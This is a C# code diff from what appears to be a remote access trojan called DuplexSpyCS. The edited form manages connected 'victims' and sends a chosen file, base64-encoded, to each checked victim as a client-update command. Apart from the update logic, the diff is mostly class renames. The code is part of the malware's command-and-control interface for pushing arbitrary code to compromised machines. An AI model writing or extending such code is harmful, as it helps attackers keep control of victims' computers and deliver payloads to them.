@@ -12,7 +12,7 @@ namespace DuplexSpyCS
 {
     public partial class frmClntUpdate : Form
     {
-        public List<Victim> m_lsVictim;
+        public List<clsVictim> m_lsVictim;
         public Form1 frmMain;
 
         public frmClntUpdate()
@@ -20,7 +20,7 @@ namespace DuplexSpyCS
             InitializeComponent();
         }
 
-        void Received(Listener listener, Victim v, string[] cmd)
+        void Received(clsTcpListener listener, clsVictim v, string[] cmd)
         {
 
             if (cmd[0] == "clnt")
@@ -33,7 +33,7 @@ namespace DuplexSpyCS
                         ListViewItem item = listView1.FindItemWithText(v.ID);
                         
                         if (item != null)
-                            item.SubItems[1].Text = nCode == 1 ? "OK" : Crypto.b64D2Str(cmd[3]);
+                            item.SubItems[1].Text = nCode == 1 ? "OK" : clsCrypto.b64D2Str(cmd[3]);
                     }));
                 }
             }
@@ -48,7 +48,7 @@ namespace DuplexSpyCS
                 return;
             }
 
-            foreach (Victim v in m_lsVictim)
+            foreach (clsVictim v in m_lsVictim)
             {
                 ListViewItem item = new ListViewItem(v.ID);
                 item.SubItems.Add("?");
@@ -97,10 +97,10 @@ namespace DuplexSpyCS
             ThreadPool.SetMaxThreads(nThd, nThd);
             foreach (ListViewItem item in listView1.CheckedItems)
             {
-                Victim v = (Victim)item.Tag;
+                clsVictim v = (clsVictim)item.Tag;
                 ThreadPool.QueueUserWorkItem(x =>
                 {
-                    v.SendCommand($"clnt|ud|{nCode}|{Crypto.b64E2Str(Path.GetFileName(szFileName))}|" + Convert.ToBase64String(abBuffer));
+                    v.SendCommand($"clnt|ud|{nCode}|{clsCrypto.b64E2Str(Path.GetFileName(szFileName))}|" + Convert.ToBase64String(abBuffer));
                 });
             }
         }
